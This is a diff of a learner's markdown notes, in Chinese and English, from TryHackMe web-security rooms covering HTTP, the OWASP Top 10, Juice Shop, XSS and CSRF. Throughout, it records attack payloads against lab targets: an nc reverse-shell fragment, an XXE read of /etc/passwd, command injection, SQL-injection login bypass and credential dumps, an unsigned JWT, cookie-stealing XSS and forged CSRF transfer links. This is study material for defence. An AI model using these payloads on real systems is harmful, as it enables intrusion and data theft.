@@ -3,10 +3,10 @@
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	--> Front End (Client-Side)
 	--> Back End (Server-Side)
-	--> HTML 
+### HTML 
 		--> <img src="img/cat-1.jpg">
 		--> injection : input area -- create a link <a herf>
-	--> JS 
+### JS 
 		--> document.getElementById("demo").innerHTML = "Hack the Planet";
 		--> <button onclick='document.getElementById("demo").innerHTML = "Hack the Planet";'>Click Me!</button>
 		--> 敏感資料暴露 e.g username //password
@@ -14,7 +14,7 @@
 ## HTTP in Detail : 
 	--> https://tryhackme.com/r/room/httpindetail
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Methods
+###  Methods
 		--> GET Request
 		--> POST Request
 			--> 提交資料並可能建立新記錄
@@ -22,7 +22,7 @@
 			--> 向網絡伺服器提交數據以更新信息
 		--> DELETE Request
 		
-	--> 狀態碼:
+###  狀態碼:
 		--> 200-299 - 成功
 			--> 200 - OK 
 			--> 201 - 創建
@@ -38,7 +38,7 @@
 		--> 500-599 - 伺服器錯誤
 			--> 500 - 內部服務錯誤
 			--> 503 - 服務不可用(停機)
-	--> 標頭 : 
+###  header : 
 		--> request : 	
 			--> GET / HTTP/1.1
 			--> Host: 想要造訪網站
@@ -56,9 +56,8 @@
 			--> Content-Encoding
 ## OWASP Top 10
 	-->https://tryhackme.com/r/room/owasptop10 
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
-	--> Broken Authentication :
-	--> Injection
+	
+###  Injection: 
 		--> SQL | command 
 		--> reverval shell : 
 			--> ;nc -e /bin/bash
@@ -76,11 +75,10 @@
 				ipconfig
 				tasklist
 				netstat -an	
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
-	--> Broken Authentication :
+	
+### Broken Authentication :
 		--> session cookies 
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
-	--> Sensitive Data Exposure :
+###  Sensitive Data Exposure :
 		--> 查詢語言（  SQL ）語法
 		--> sqlite3 <database-name>
 			> .tables  :查看資料庫中的表
@@ -88,8 +86,7 @@
 			> SELECT * FROM customers;
 			
 			--> hash : https://crackstation.net/
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
-	--> XML External Entity (XXE)
+### > XML External Entity (XXE)
 		--> RCE | DOS | SSRF
 		--> !DOCTYPE : 定義 ROOT 元素
 			--> !ELEMENT : 定義一個新的元素
@@ -109,34 +106,27 @@
 			<?xml version="1.0"?>
 			<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
 			<root>&read;</root>		
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
-	--> Broken Access Control : 
+###  Broken Access Control : 
 		--> IDOR : 輸入處理方式中的錯誤配置
 		--> id =1 => id =2
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
-	--> Security Misconfiguration :
+###  Security Misconfiguration :
 		--> 安全配置錯誤
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
-	--> Cross-site Scripting
+###  Cross-site Scripting
 		--> XSS (Javascript、VBScript、Flash 和 CSS)
 		--> Test : <script>alert(“Hello World”)</script>
 		--> document.write) => 覆蓋網站的 HTML
 		--> XSS Keylogger =>記錄使用者的所有擊鍵
 			--> http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
-	--> Insecure Deserialization (不安全反序列化)
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Components with Known Vulnerabilities (具有已知漏洞的元件)
+###  Insecure Deserialization (不安全反序列化)
+###  Components with Known Vulnerabilities (具有已知漏洞的元件)
 		--> outdata and don.t updata
 		--> exploit-db
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
-	--> Insufficent Logging & Monitoring (日誌記錄與監控不足)
+###  Insufficent Logging & Monitoring (日誌記錄與監控不足)
+
 ## OWASP Top 10 - 2021
 	--> https://tryhackme.com/r/room/owasptop102021
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Broken Access Control (IDOR) --id
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Cryptographic Failures
+###  Broken Access Control (IDOR) --id
+### Cryptographic Failures
 		--> 敏感資料外洩
 		--> 結構化查詢語言（SQL） : 
 			=> sqlite3 <database-name>
@@ -149,28 +139,22 @@
 			> .tables
 			> PRAGMA table_info(users);
 			> SELECT * FROM users; 
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Injection
+###  Injection
 		--> SQL Injection :
 		--> command Injection : $(cat /etc/passwd)
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Insecure Design 
+###  Insecure Design 
 		--> 設計缺陷 :密碼重置機制
 			--> joseph 
 			--> colour : ROYGBIV (Red, Orange, Yellow, Green, Blue, Indigo, and Violet)
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Security Misconfiguration(安全配置錯誤)
+###  Security Misconfiguration(安全配置錯誤)
 		=> 調試介面 /console
 			--> import os; print(os.popen("ls -l").read())
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Vulnerable and Outdated Components
+###  Vulnerable and Outdated Components
 		--> CVE :  Exploit-DB 
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Identification and Authentication Failures
+###  Identification and Authentication Failures
 		=> admin = admin%20
 		=> darren
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Software and Data Integrity Failures
+###  Software and Data Integrity Failures
 		--> check Hash value => prove 完整性
 			=> md5sum | sha1sum | sha256sum
 		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
@@ -191,8 +175,7 @@
 			--> {"typ":"JWT","alg":"none"} {"username":"admin","exp":1718450906}
 			--> eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE4NDUwOTA2fQ.
 	
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Security Logging & Monitoring Failures
+###  Security Logging & Monitoring Failures
 		-->  安全日誌​​記錄和監控故障
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	--> Server-Side Request Forgery (SSRF)
@@ -202,7 +185,7 @@
 ## OWASP Juice Shop
 	--> https://tryhackme.com/r/room/owaspjuiceshop
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Injection
+###  Injection
 		--> SOLi : 
 			--> login 
 				=> email : ' or 1=1 --
@@ -213,8 +196,7 @@
 			-->  database : 
 				=> 搜尋欄 : union select 1,email,password,4,5,6,7 from users;--
 				=> 網址 : http://ip:port/rest/product/search?q=a')%20union%20select%20email,%20password,%203,%204,%205,%206,%207%20from%20users;--
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Broken Authentication
+###  Broken Authentication
 		-->  Bruteforce 
 			=> admin@juice-sh.op
 			=> password : §§ 
@@ -222,8 +204,7 @@
 			=> cp /usr/share/dirb/wordlists/others/best1050.txt best1050.txt
 		--> 重置密碼機制 
 			=> 忘記密碼 : brother name -- Samuel
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Sensitive Data Exposure
+###  Sensitive Data Exposure
 		--> About us :使用條款
 			=> http://10.10.118.205 /ftp/legal.md
 			=> 下載 Acquisitions.md
@@ -235,8 +216,7 @@
 					--> NULL 終止符 : 告訴伺服器在該點終止，從而將字串的其餘部分清空
 					--> URL 中 NULL 位元組的百分號必須自行編碼 (%25 = %)
 				=> /ftp/package.json.bak%2500.md
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Broken Access Control
+###  Broken Access Control
 		--> F12 :  http://10.10.118.205 /main-es2015.js
 			=> path：administration
 			=> http://ip:port/#/administration
@@ -244,8 +224,7 @@
 		--> GET /rest/basket/1 HTTP/1.1 =>  GET /rest/basket/2 HTTP/1.1
 		
 		--> http://MACHINE_IP /#/administration
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> Cross-Site Scripting XSS		
+###  Cross-Site Scripting XSS		
 		--> DOM
 			=> 搜尋欄 : <iframe src="javascript:alert(`xss`)">
 			=> 搜尋欄 : <script>alert("XSS1")</script>
@@ -268,8 +247,7 @@
 		--> 反射型 XSS : 
 			--> history
 			--> id=<iframe src="javascript:alert(`xss`)">
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> challenges
+###  challenges
 		--> /#/score-board/	
 		--> 以其他用戶的名義發布一些反饋 : {"UserId":2,"rating":2,"comment":"1"}	
 		--> NULL 位元組 : %00
@@ -296,8 +274,7 @@
 			--> atob("base64_string") //base64 -d
 			--> document.cookie
 			--> alert(document.cookie)
-		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
-		--> Reflected XSS : 
+###  Reflected XSS : 
 			--> 易受攻擊的程式碼:
 			--> PHP : 
 				--> easy to chage value => $_GET['q'];
@@ -324,8 +301,7 @@
 					 var userInput = Request.QueryString["q"];
 					 Response.Write("User Input: " + userInput);
 				--> recover : HttpUtility.HtmlEncode(userInput)
-		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
-		--> Stored XSS :
+###  Stored XSS :
 			--> PHP : 
 				--> $comment = $_POST['comment'];
 					 mysqli_query($conn, "INSERT INTO comments (comment) VALUES ('$comment')");
@@ -340,8 +316,7 @@
 			--> C# ASP.NET
 				--> HttpUtility.HtmlEncode() | Parameters.AddWithValue()
 				
-		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
-		--> DOM-Based XSS : 
+###  DOM-Based XSS : 
 			--> F12=>Console
 				--> 建立新元素 document.createElement()
 				--> 為任何元素新增子元素 element.append()
@@ -351,8 +326,7 @@
 			--> recover : 
 				--> 1. 避免直接使用document.write()
 				--> 2. encodeURIComponent(name)
-		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-		--> case : 
+###  case : 
 			--> Between HTML tags : <script>alert(document.cookie)</script>
 			--> Within HTML tags  : "><script>alert(document.cookie)</script>
 			--> Inside JavaScript : ';alert(document.cookie)//
@@ -373,8 +347,7 @@
 		--> Stored XSS :
 			=> connect : <script>alert(document.cookie)</script>
 				=> login :admin | admin123
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> CSRF 
+##  CSRF 
 		---> 跨站點請求偽造（CSRF 或XSRF）
 			--> 利用cookie（憑證）的事實來實現的
 			--> 攻擊者代表使用者（透過瀏覽器）偽造和提交未經授權的請求
@@ -439,8 +412,7 @@
 			<a href="http://mybank.thm:8080/dashboard.php?to_account=GB82MYBANK5698&amount=1000" target="_blank">Click Here to Redeem</a>
 		=> 2. Double Submit Cookie Bypass
 			--> change password => 自動提交表單以更改密碼 => login 
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-	--> DOM 
+## DOM 
 		--> Document Object Model
 		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 		--> JS : F12=>Console
